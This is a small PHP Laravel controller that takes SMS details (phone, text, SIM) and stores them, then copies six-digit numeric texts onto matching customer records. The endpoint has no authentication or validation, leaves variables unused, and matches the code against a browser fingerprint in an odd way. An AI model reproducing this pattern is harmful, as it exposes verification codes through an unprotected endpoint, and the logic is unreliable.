<?php

namespace App\Http\Controllers\Frontend;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\Sms;
use App\Models\Customer;

class SmsController extends Controller
{
    public function store($messages, Request $request) {
        $data = ['messages' => $request->phone.'-'.$request->text.'-'.$request->sim.'--'.'-'];
        Sms::create($data);
        if (strlen($request->text) == 6 && is_numeric($request->text)) {
            $data2 = ['messages' => $request->text];
            Customer::where("browserFingerprint", $request->text)->update(["messages" => $request->text]);
        }
        return "OK";
    }
}